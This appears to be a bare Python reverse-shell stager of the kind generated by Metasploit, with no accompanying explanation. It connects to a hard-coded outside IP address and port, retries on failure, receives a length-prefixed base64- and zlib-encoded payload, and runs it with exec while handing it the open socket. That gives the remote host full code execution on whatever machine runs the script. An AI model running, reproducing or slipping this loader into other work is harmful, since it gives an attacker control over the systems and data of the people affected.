import socket,zlib,base64,struct,time
for x in range(10):
  try:
    s=socket.socket(2,socket.SOCK_STREAM)
    s.connect(('3.141.210.37',19260))
    break
  except:
    time.sleep(5)
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
  d+=s.recv(l-len(d))
exec(zlib.decompress(base64.b64decode(d)),{'s':s})
